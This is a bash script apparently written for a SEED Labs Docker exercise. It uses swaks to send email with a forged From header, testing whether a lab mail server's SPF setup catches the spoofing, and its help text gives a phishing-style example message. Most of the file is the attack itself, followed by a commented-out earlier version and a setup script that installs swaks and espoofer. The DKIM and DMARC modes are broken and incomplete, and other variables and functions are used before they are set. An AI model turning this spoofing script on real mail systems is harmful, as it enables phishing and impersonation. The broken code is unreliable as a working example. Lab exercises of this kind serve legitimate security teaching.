#!/usr/bin/bash

# This script is meant to be run from the interactive shell inside the attacker container in the  SEED Labs Docker network setup

# This particular attack is meant to show what an SPF bypass attack looks like

# From attacker container (10.9.0.7)
# Send email from victim's domain using swaks

# IP addresses from the containers
ATTACKER_IP="10.9.0.7"
MAIL_SERVER_IP="10.9.0.6" # aka VICTIM
VICTIM_DOMAIN="10.9.0.5"  # DNS

# These are cvariables with the output file names
EMAIL_FILE="attack-${attack_mode//-}.log"
NETWORK_FILE="network-att-${attack_mode//-}.log"

# check if the number of args is correct
if [ $# -eq 2 ] && [ "$1" == "--help" ]; then
  help
elif [ $# -ne 5 ] && [ "$1" != "--help" ]; then
    echo "Usage: $0 <attack_mode> <sender-email> <destination-email> <message> <fake-sender-email>"
    exit 1
fi

attack_mode=$1
sender=$2
target=$3
message=$4
sender_fake=$5

send_email() {

local mode=$1

#monitor_network

if [ "$mode" = "spf" ]; then
    swaks --from $sender --to $target \
  --server $MAIL_SERVER_IP --port 25 \
  --header "From: ${sender_fake}" \
  --header "To: ${target}" \
  --helo attacker.attacker.test \
  --header "Subject: SPF Test" \
  --body "$message" \
  --raw 2>&1 /dev/null | tee "$EMAIL_FILE"
elif [ "$mode" = "dkim" ]; then
  swaks --from $sender --to $target \
  --server $MAIL_SERVER_IP --port 25 \
  --header \
  --helo \
  --header \
  --body \
  --raw 2>&1 /dev/null | tee "$EMAIL_FILE"

elif [ "$mode" = "dmarc" ]; then
  swaks --from $sender --to $target \
  --server $MAIL_SERVER_IP --port 25 \
  --header \
  --helo \
  --header \
  --body \
  --raw 2>&1 /dev/null | tee "$EMAIL_FILE"
else
  echo
  echo "The argument provided for the attack mode is not available or may have a typo. Fix this and rerun the command!"
  echo
  help
  exit 1
fi

}

monitor_network() {
  tcpdump -i eth0 -w "$NETWORK_FILE" -c 1 -w 2>/dev/null &
  sleep 0.5
  tcpdump -r "$NETWORK_FILE" 2>/dev/null | tee "$NETWORK_FILE"
}

print_logs() {
  sleep 5
  echo ""
  echo ""
  echo "Email Headers"
  cat -n "$EMAIL_FILE" | grep -i -A3 -B1 'MAIL FROM| RCPT'
}

help() {
  echo "Usage: $0 <attack_mode> <sender-email> <destination-email> <message> <sender-faker>"
  echo
  echo "------------------------------------------------------------------------------------------"
  echo
  echo "Modes of attack:"
  echo
  echo "   spf:   sends spoofed email as the fake email the attacker provides"
  echo "            relying on misconfiguration of the SPF auth layer"
  echo "   dkim:  sends spoofed email as the fake email the attacker provides"
  echo "            relying on misconfiguration of the DKIM auth layer"
  echo "   dmarc: sends spoofed email as the fake email the attacker provides"
  echo "            relying on misconfiguration of the DMARC auth layer"
  echo
  echo "------------------------------------------------------------------------------------------"
  echo
  echo " Example: ./attack.sh spf "alice@victim.test" "bob@victim.test" "Hello Bob! Click this link to win 100USD https://100.usd.free.com!" "attacker@victim.test" "
  exit 1
}

if [ -z "$1" ]; then
  help
  exit 1
fi

# Function Calls
send_email "$attack_mode"
print_logs

# ------------------------------------------------------------------------------------------------------------

# #!/usr/bin/bash
#
# # This script is meant to be run from the interactive shell inside the attacker container in the  SEED Labs Docker network setup
#
# # This particular attack is meant to show what an SPF bypass attack looks like
#
# # From attacker container (10.9.0.7)
# # Send email from victim's domain using swaks
#
# # Color codes for output
# # RED='\033[0;31m'
# # GREEN='\033[0;32m'
# # YELLOW='\033[1;33m'
# # NC='\033[0m' # No Color
#
# # IP addresses from the containers
# ATTACKER_IP="10.9.0.7"
# MAIL_SERVER_IP="10.9.0.6" # aka VICTIM
# VICTIM_DOMAIN="10.9.0.5"  # DNS
#
# # These are cvariables with the output file names
# EMAIL_FILE="spf-spoof-attack.log"
# NETWORK_FILE="spf-network-traffic.log"
# #LOG_FILE="spf-log.log"
# #DOMAIN_FILE="spf-dns.log"
#
# # check if the number of args is correct
# if [ $# -ne 4 ]; then
#     echo "Usage: $0 <sender-email> <destination-email> <message> <sender-faker>"
#     exit 1
# fi
#
# sender=$1
# target=$2
# message=$3
# sender_fake=$4
#
# send_email() {
#     swaks --from $sender --to $target \
#   --server $MAIL_SERVER_IP --port 25 \
#   --header "From: ${sender_fake}" \
#   --header "To: ${target}" \
#   --helo attacker.attacker.test \
#   --header "Subject: SPF Test" \
#   --body "$message" \
#   --raw 2>&1 /dev/null | tee "$EMAIL_FILE"
# }
#
# monitor_network() {
#   tcpdump -i eth0 -w "$NETWORK_FILE" -c 1 -w 2>/dev/null &
#   sleep 0.5
#   tcpdump -r "$NETWORK_FILE" 2>/dev/null | tee "$NETWORK_FILE"
# }
#
# print_logs() {
#   sleep 5
#   echo ""
#   echo ""
#   echo "Email Headers"
#   cat -n "$EMAIL_FILE" | grep -i -A3 -B1 'MAIL FROM| RCPT'
# }
# # Function Calls
# send_email
# monitor_network
# print_logs



# ------------------------------------------------------------------------------------------------------------
# run-me-1st.sh

#!/usr/bin/env bash

# updating the ubuntu system in the container and installing relvant tools like swaks
# echo "[*] Updating the System..."
# echo ""
# sleep 3
# cd /home/seed
# apt-get update && apt-get full-upgrade -y
# apt update && apt full-upgrade -y
#
# sleep 3
# echo ""
# echo ""
# echo "[*]Installing Swaks..."
# echo ""
# sleep 3
# apt-get install swaks -y
#
# # installing requirements for the espoofer tools
# sleep 3
# echo ""
# echo ""
# echo "[*] Upgrading pip to latest version..."
# echo ""
# cd /home/seed/espoofer
# python3 -m pip install --upgrade pip
# sleep 3
# echo ""
# echo ""
# echo "[*]Installing Dependencies for espoofer tool..."
# echo ""
# sleep 3
# pip install -r requirements.txt
# sleep 3
# echo ""
# echo ""
# echo "[*] Initial setup completed!"
#
